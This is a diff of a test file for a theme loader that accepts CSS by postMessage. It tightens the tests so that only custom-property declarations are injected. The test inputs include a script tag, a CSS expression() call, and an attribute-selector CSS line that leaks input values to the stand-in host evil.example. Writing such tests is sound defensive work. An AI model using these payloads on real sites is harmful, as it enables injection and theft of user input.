@@ -283,7 +283,7 @@ describe("ThemeLoader postMessage handling", () => {
 
     act(() => {
       const ev = new MessageEvent("message", {
-        data: { type: "theme.css", rules: "body { color: red; }" },
+        data: { type: "theme.css", rules: "--accent: red; --radius: 8px" },
         source: fakeSource as Window,
       });
       window.dispatchEvent(ev);
@@ -292,11 +292,11 @@ describe("ThemeLoader postMessage handling", () => {
     await waitFor(() => {
       const style = document.getElementById(styleId);
       expect(style).not.toBeNull();
-      expect(style!.textContent).toContain("body { color: red; }");
+      expect(style!.textContent).toBe(":root{--accent:red;--radius:8px}");
     });
   });
 
-  it("theme.css sanitizes dangerous patterns before injection", async () => {
+  it("theme.css injects nothing when no declaration survives the policy", async () => {
     mockPluginId.value = "dark";
     mockAccessToken.value = "TOKEN";
     eveyFetchRawMock.mockImplementation(makeOkResponse);
@@ -319,19 +319,19 @@ describe("ThemeLoader postMessage handling", () => {
         new MessageEvent("message", {
           data: {
             type: "theme.css",
-            rules: "body { background: expression(alert(1)); } <script>evil()</script>",
+            rules:
+              "body { background: expression(alert(1)); } <script>evil()</script>" +
+              `input[value^="a"]{background:url("https://evil.example/leak")}`,
           },
           source: fakeSource as Window,
         }),
       );
     });
 
-    await waitFor(() => {
-      const style = document.getElementById("evey-theme-injected-dark");
-      expect(style).not.toBeNull();
-      expect(style!.textContent).not.toContain("expression(");
-      expect(style!.textContent).not.toContain("<script>");
-    });
+    // Nothing is filtered out of a rule any more - a payload that is not a
+    // custom property declaration produces no <style> at all.
+    await new Promise((r) => setTimeout(r, 20));
+    expect(document.getElementById("evey-theme-injected-dark")).toBeNull();
   });
 
   it("ignores postMessage from unknown source", async () => {
